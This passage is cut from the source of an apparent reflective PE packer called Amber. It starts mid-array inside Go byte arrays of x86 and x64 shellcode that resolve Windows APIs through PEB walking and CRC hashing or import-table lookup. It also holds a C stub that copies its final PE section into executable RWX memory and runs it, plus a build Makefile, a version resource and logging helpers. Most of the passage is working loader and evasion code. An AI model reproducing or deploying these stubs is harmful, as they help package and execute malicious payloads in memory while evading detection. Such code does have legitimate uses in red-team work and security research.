	0x8b, 0x01, 0x3d, 0x4c, 0x8b, 0xd1, 0xb8, 0x74, 0x02, 0xe2, 0xef, 0x48,
	0xc1, 0xe8, 0x20, 0xeb, 0x03, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xec, 0x5d,
	0x59, 0xc3, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x59, 0x48, 0x29, 0xf1, 0x48,
	0x83, 0xc1, 0x14, 0x48, 0x89, 0xf7, 0x48, 0x83, 0xef, 0x05, 0xf3, 0xaa,
	0xfc, 0x48, 0x89, 0xec, 0x5d, 0xff, 0xe0,
}

var CRC_API_64 = []byte{
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48,
	0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48,
	0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x41,
	0xb9, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c,
	0x02, 0x2c, 0x20, 0xf2, 0x44, 0x0f, 0x38, 0xf0, 0xc8, 0xe2, 0xee, 0x52,
	0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0,
	0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x65, 0x8b, 0x80, 0x88, 0x00,
	0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x5a, 0x48, 0x01, 0xd0, 0x50, 0x8b,
	0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x49, 0x4c,
	0x8b, 0x4c, 0x24, 0x08, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
	0x01, 0xd6, 0x48, 0x31, 0xc0, 0xac, 0xf2, 0x44, 0x0f, 0x38, 0xf0, 0xc8,
	0x38, 0xe0, 0x75, 0xf2, 0x45, 0x39, 0xd1, 0x75, 0xdc, 0x58, 0x44, 0x8b,
	0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b,
	0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0,
	0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0xc3,
	0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff,
}

var CRC_API_32 = []byte{
	0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c,
	0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,
	0xbf, 0x00, 0x00, 0x00, 0x00, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20,
	0xf2, 0x0f, 0x38, 0xf0, 0xf8, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52, 0x10,
	0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x42, 0x01, 0xd1, 0x51,
	0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x34, 0x8b, 0x7d,
	0xf8, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0xac, 0xf2, 0x0f, 0x38, 0xf0,
	0xf8, 0x38, 0xe0, 0x75, 0xf6, 0x3b, 0x7d, 0x24, 0x75, 0xe6, 0x58, 0x8b,
	0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,
	0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b,
	0x61, 0xc3, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x8e,
}

var IAT_API_64 = []byte{
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48,
	0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48,
	0x8b, 0x52, 0x20, 0x52, 0x66, 0x03, 0x52, 0x3c, 0x8b, 0x92, 0x90, 0x00,
	0x00, 0x00, 0x48, 0x03, 0x14, 0x24, 0x52, 0x48, 0x8b, 0x74, 0x24, 0x08,
	0x48, 0x83, 0xec, 0x10, 0x48, 0x83, 0xea, 0x14, 0x48, 0x83, 0xc2, 0x14,
	0x83, 0x3a, 0x00, 0x0f, 0x84, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x74,
	0x24, 0x10, 0x66, 0x8b, 0x72, 0x0c, 0x48, 0x31, 0xff, 0x48, 0x31, 0xc0,
	0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xf2, 0x0f, 0x38, 0xf0, 0xf8,
	0xf2, 0x0f, 0x38, 0xf0, 0xfc, 0x84, 0xc0, 0x75, 0xe8, 0x48, 0x89, 0x54,
	0x24, 0x08, 0x89, 0x3c, 0x24, 0x8b, 0x0a, 0x48, 0x03, 0x4c, 0x24, 0x18,
	0x48, 0x83, 0xe9, 0x08, 0x48, 0x8b, 0x3c, 0x24, 0x48, 0x83, 0xc1, 0x08,
	0x83, 0x39, 0x00, 0x74, 0xaf, 0x8b, 0x31, 0x48, 0x0f, 0xba, 0xf6, 0x3f,
	0x72, 0xea, 0x48, 0x03, 0x74, 0x24, 0x18, 0x48, 0x83, 0xc6, 0x02, 0x48,
	0x31, 0xc0, 0xac, 0xf2, 0x0f, 0x38, 0xf0, 0xf8, 0x38, 0xe0, 0x75, 0xf3,
	0x44, 0x39, 0xd7, 0x75, 0xcf, 0x8b, 0x42, 0x10, 0x8b, 0x12, 0x48, 0x03,
	0x54, 0x24, 0x18, 0x48, 0x29, 0xd1, 0x48, 0x03, 0x44, 0x24, 0x18, 0x48,
	0x01, 0xc8, 0x41, 0x58, 0x41, 0x58, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59,
	0x5a, 0x41, 0x58, 0x41, 0x59, 0x48, 0x8b, 0x00, 0xc3, 0x48, 0x83, 0xc4,
	0x48, 0xc3,
}

var IAT_API_32 = []byte{
	0x60, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52,
	0x14, 0x8b, 0x52, 0x10, 0x52, 0x03, 0x52, 0x3c, 0x8b, 0x92, 0x80, 0x00,
	0x00, 0x00, 0x03, 0x14, 0x24, 0x52, 0x8b, 0x74, 0x24, 0x04, 0x83, 0xec,
	0x08, 0x83, 0xea, 0x14, 0x83, 0xc2, 0x14, 0x83, 0x3a, 0x00, 0x74, 0x77,
	0x8b, 0x74, 0x24, 0x08, 0x66, 0x8b, 0x72, 0x0c, 0x31, 0xff, 0xac, 0x3c,
	0x61, 0x7c, 0x02, 0x2c, 0x20, 0xf2, 0x0f, 0x38, 0xf0, 0xf8, 0xf2, 0x0f,
	0x38, 0xf0, 0xfc, 0x84, 0xc0, 0x75, 0xeb, 0x89, 0x54, 0x24, 0x04, 0x89,
	0x3c, 0x24, 0x8b, 0x0a, 0x03, 0x4c, 0x24, 0x0c, 0x83, 0xe9, 0x04, 0x8b,
	0x3c, 0x24, 0x83, 0xc1, 0x04, 0x83, 0x39, 0x00, 0x74, 0xbe, 0x8b, 0x31,
	0x81, 0xfe, 0x00, 0x00, 0x00, 0x80, 0x79, 0xeb, 0x03, 0x74, 0x24, 0x0c,
	0x83, 0xc6, 0x02, 0xac, 0xf2, 0x0f, 0x38, 0xf0, 0xf8, 0x84, 0xc0, 0x75,
	0xf6, 0x3b, 0x7c, 0x24, 0x34, 0x75, 0xd4, 0x8b, 0x42, 0x10, 0x8b, 0x12,
	0x03, 0x54, 0x24, 0x0c, 0x29, 0xd1, 0x03, 0x44, 0x24, 0x0c, 0x01, 0xc8,
	0x89, 0x44, 0x24, 0x2c, 0x83, 0xc4, 0x10, 0x61, 0x8b, 0x00, 0xc3, 0x83,
	0xc4, 0x0f, 0x61, 0xc3,
}

```

`stub/Makefile`:

```
normal:
	i686-w64-mingw32-windres Resource.rc -o res.o
	i686-w64-mingw32-g++-win32 -c stub.c -o stub.o
	i686-w64-mingw32-g++-win32 -Wl,--subsystem,windows stub.o res.o -o stub32.exe
	i686-w64-mingw32-strip stub32.exe
	x86_64-w64-mingw32-windres Resource.rc -o res.o
	x86_64-w64-mingw32-g++-win32 -c stub.c -o stub.o
	x86_64-w64-mingw32-g++-win32 -Wl,--subsystem,windows stub.o res.o -o stub.exe
	x86_64-w64-mingw32-strip stub.exe
	rm *.o

```

`stub/Resource.rc`:

```rc
id ICON "amber.ico"
2 VERSIONINFO
FILEVERSION     2,1,0,0
PRODUCTVERSION  2,1,0,0
BEGIN
  BLOCK "StringFileInfo"
  BEGIN
    BLOCK "080904E4"
    BEGIN
      VALUE "CompanyName", "PRODAFT"
      VALUE "FileDescription", "Amber - Reflective PE Packer"
      VALUE "FileVersion", "2.1"
      VALUE "InternalName", "AMBER"
      VALUE "LegalCopyright", "Ege Balci"
      VALUE "OriginalFilename", "amber.exe"
      VALUE "ProductName", "AMBER - Reflective PE Packer"
      VALUE "ProductVersion", "3.0.0"
    END
  END
  BLOCK "VarFileInfo"
  BEGIN
    VALUE "Translation", 0x809, 1252
  END
END

```

`stub/stub.c`:

```c
#include <windows.h>

int main(int argc, char const *argv[])
{

    // Just for the imports
    HMODULE k32 = LoadLibrary("USER32.dll");
    GetProcAddress(k32, "VirtualAlloc");

    // Get module handle
    LPVOID moduleHandle = GetModuleHandle(NULL);
    if (moduleHandle == NULL)
        return 1;

    PIMAGE_DOS_HEADER dosHeader = {};
    PIMAGE_SECTION_HEADER sectionHeader = {};
    dosHeader = (PIMAGE_DOS_HEADER)moduleHandle;

#if defined(__MINGW64__) || defined(_WIN64)
    PIMAGE_NT_HEADERS64 imageNTHeaders = {};
    imageNTHeaders = (PIMAGE_NT_HEADERS64)(moduleHandle + dosHeader->e_lfanew);
    __int64 sectionLocation = (__int64)((__int64)(&imageNTHeaders->OptionalHeader) + (WORD)imageNTHeaders->FileHeader.SizeOfOptionalHeader);
    FlushInstructionCache(moduleHandle, NULL, NULL);
#else
    PIMAGE_NT_HEADERS imageNTHeaders = {};
    imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)moduleHandle + dosHeader->e_lfanew);
    DWORD sectionLocation = (DWORD) & (imageNTHeaders->OptionalHeader) + (WORD)imageNTHeaders->FileHeader.SizeOfOptionalHeader;
#endif

    DWORD sectionSize = (DWORD)sizeof(IMAGE_SECTION_HEADER);
    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
    {
        sectionHeader = (PIMAGE_SECTION_HEADER)sectionLocation;
        sectionLocation += sectionSize;
    }
    // Execute last section data
    unsigned char *buffer = (unsigned char *)VirtualAlloc(NULL, sectionHeader->SizeOfRawData, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy((void *)buffer, (void *)(sectionHeader->VirtualAddress + imageNTHeaders->OptionalHeader.ImageBase), sectionHeader->SizeOfRawData);
    (*(void (*)())buffer)();

    return 0;
}

```

`utils/helpers.go`:

```go
package utils

import (
	"fmt"
	"math/rand"
	"os"
	"runtime"
	"strings"

	"github.com/fatih/color"
	"github.com/sirupsen/logrus"
)

func PrintSuccess(formatstr string, a ...interface{}) {
	green := color.New(color.FgGreen).Add(color.Bold)
	green.Print("[*] ")
	fmt.Printf(formatstr, a...)
}

func PrintStatus(formatstr string, a ...interface{}) {
	blue := color.New(color.FgBlue).Add(color.Bold)
	blue.Print("[*] ")
	fmt.Printf(formatstr, a...)
}

func PrintWarning(formatstr string, a ...interface{}) {
	yellow := color.New(color.FgYellow).Add(color.Bold)
	yellow.Print("[*] ")
	fmt.Printf(formatstr, a...)
}

func PrintErr(formatstr string, a ...interface{}) {
	red := color.New(color.FgRed).Add(color.Bold)
	white := color.New(color.FgWhite).Add(color.Bold)
	red.Print("[-] ")
	white.Printf(formatstr, a...)
}

func PrintGreen(formatstr string, a ...interface{}) {
	green := color.New(color.FgGreen).Add(color.Bold)
	green.Printf(formatstr, a...)
}

func PrintFatal(err error) {
	if err != nil {
		pc, _, _, ok := runtime.Caller(1)
		details := runtime.FuncForPC(pc)
		if ok && details != nil {
			logrus.Fatalf("%s: %s\n", strings.ToUpper(strings.Split(details.Name(), ".")[1]), err)
		} else {
			logrus.Fatal(err)
		}
	}
}

// randomString - generates random string of given length
func RandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	random := make([]byte, length)
	for i := 0; i < length; i++ {
		random[i] = charset[rand.Intn(len(charset))]
	}
	return string(random)
}

// GetFileSize retrieves the size of the file with given file path
func GetFileSize(filePath string) (int, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return 0, err
	}
	defer file.Close()
	stat, err := file.Stat()
	if err != nil {
		return 0, err
	}
	return int(stat.Size()), nil
}

```